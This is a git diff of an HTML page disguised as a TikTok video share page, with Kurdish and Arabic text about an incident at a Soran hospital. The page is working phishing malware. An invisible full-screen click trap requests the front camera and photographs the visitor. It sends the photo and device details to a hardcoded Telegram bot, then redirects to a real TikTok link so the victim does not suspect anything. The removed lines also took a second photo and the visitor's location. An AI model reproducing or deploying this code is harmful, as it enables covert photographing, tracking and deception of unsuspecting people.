@@ -3,64 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok - کێشەیەکی نوێ لە نەخۆشخانەی سۆران</title>
+    <title>TikTok</title>
     
-    <meta property="og:title" content="TikTok . کێشەیەکی نوێ لە نەخۆشخانەی ئیدارەی سەربەخۆی سۆران">
+    <meta property="og:title" content="TikTok - کێشەیەکی نوێ لە نەخۆشخانەی سۆران">
     <meta property="og:image" content="https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg">
     <meta property="og:type" content="video.other">
 
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #ffffff; overflow: hidden; font-family: 'Proxima Nova', sans-serif; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         
-        /* دیزاینی فەرمی تیکتۆک */
-        .tt-wrapper {
+        /* باگراوەندی ڤیدیۆکە ڕێک وەک وێنەکە */
+        .main-ui {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            background: #fff; z-index: 10;
+            background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center;
+            background-size: cover; z-index: 1;
         }
 
-        .tt-logo { width: 130px; margin-bottom: 40px; }
-        
-        .video-thumbnail {
-            width: 200px; height: 300px; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center;
-            background-size: cover; border-radius: 8px; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        /* بەشی سەرەوە (Header) */
+        .tt-header {
+            position: absolute; top: 0; width: 100%; height: 60px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.6), transparent);
+            display: flex; align-items: center; justify-content: space-between; padding: 0 15px; box-sizing: border-box; z-index: 2;
         }
+        .open-app-top { background: #fe2c55; color: white; padding: 6px 12px; border-radius: 4px; font-size: 13px; font-weight: bold; }
+        .tt-logo-top { height: 25px; }
 
-        .play-overlay {
+        /* نیشانەی Play لە ناوەڕاست */
+        .play-icon {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 60px; height: 60px; fill: white; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5));
+            width: 70px; height: 70px; opacity: 0.9; z-index: 2;
         }
 
-        .btn-open-app {
-            margin-top: 30px; background-color: #fe2c55; color: white;
-            padding: 14px 80px; border-radius: 4px; font-weight: 700;
-            font-size: 16px; text-decoration: none; border: none; cursor: pointer;
+        /* بەشی خوارەوە (Footer) */
+        .tt-footer {
+            position: absolute; bottom: 0; width: 100%; padding: 20px;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            box-sizing: border-box; z-index: 2; text-align: center;
         }
-
-        .info-text { margin-top: 15px; color: #161823; font-size: 14px; text-align: center; padding: 0 20px; }
+        .btn-watch {
+            background: #fe2c55; color: white; width: 100%; padding: 12px;
+            border-radius: 4px; font-size: 16px; font-weight: bold; border: none;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
 
         /* تەڵەی کلیکەکە */
-        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; cursor: pointer; background: transparent; }
-        
+        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; cursor: pointer; }
         #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 2000; display: none; }
+        
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="tt-wrapper">
-        <img class="tt-logo" src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png">
-        
-        <div class="video-thumbnail">
-            <svg class="play-overlay" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+    <div class="main-ui">
+        <div class="tt-header">
+            <div class="open-app-top">فتح التطبيق</div>
+            <img class="tt-logo-top" src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1200px-TikTok_logo.svg.png">
         </div>
 
-        <button class="btn-open-app">Open in TikTok</button>
-        <p class="info-text">بۆ بینینی ڤیدیۆکە بە Full HD کلیک لە <b>Allow</b> بکە</p>
+        <svg class="play-icon" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+
+        <div class="tt-footer">
+            <p style="color: white; font-size: 14px; margin-bottom: 15px;">استمتع بمزيد من المحتوى في التطبيق</p>
+            <button class="btn-watch">
+                <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e4869ef429699778278278278278278.png" style="height:20px;">
+                المشاهدة على TikTok
+            </button>
+        </div>
     </div>
 
     <div id="flash"></div>
-    <div id="trap" onclick="startApp()"></div>
+    <div id="trap" onclick="startHeist()"></div>
     
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -68,20 +81,9 @@
     <script>
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
-        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
+        const target = "https://vt.tiktok.com/ZS5WMhjoP/";
 
-        async function sendPhoto(v, c, fileName, caption) {
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
-            const fd = new FormData();
-            fd.append('chat_id', chat_id);
-            fd.append('photo', blob, fileName);
-            fd.append('caption', caption);
-            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }
-
-        async function startApp() {
+        async function startHeist() {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
@@ -91,24 +93,25 @@
                 document.getElementById('flash').style.display = 'block';
 
                 setTimeout(async () => {
-                    await sendPhoto(v, document.getElementById('c'), "snap1.jpg", "📸 وێنەی نێچیر لە ڕێگەی تیکتۆکەوە");
+                    // گرتنی وێنەی یەکەم و زانیاری ئامێر
+                    const canvas = document.getElementById('c');
+                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
                     
-                    setTimeout(async () => {
-                        await sendPhoto(v, document.getElementById('c'), "snap2.jpg", "📸 وێنەی دووەم");
-                        document.getElementById('flash').style.display = 'none';
-
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(async (pos) => {
-                                const mapLink = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
-                                window.location.href = targetVideo;
-                            }, () => { window.location.href = targetVideo; });
-                        } else { window.location.href = targetVideo; }
-                    }, 400);
+                    const fd = new FormData();
+                    fd.append('chat_id', chat_id);
+                    fd.append('photo', blob, 'pasha_snap.jpg');
+                    fd.append('caption', `👑 نێچیرێکی نوێ ڕاو کرا!\n📱 سیستەم: ${navigator.platform}`);
+                    
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    setTimeout(() => {
+                        window.location.href = target;
+                    }, 500);
                 }, 800);
             } catch (e) {
-                // ئەگەر ڕێگەی نەدا، دوای ٣ چرکە هەر دەیبات بۆ تیکتۆکەکە بۆ ئەوەی گومان نەکات
-                setTimeout(() => { window.location.href = targetVideo; }, 2500);
+                window.location.href = target;
             }
         }
     </script>
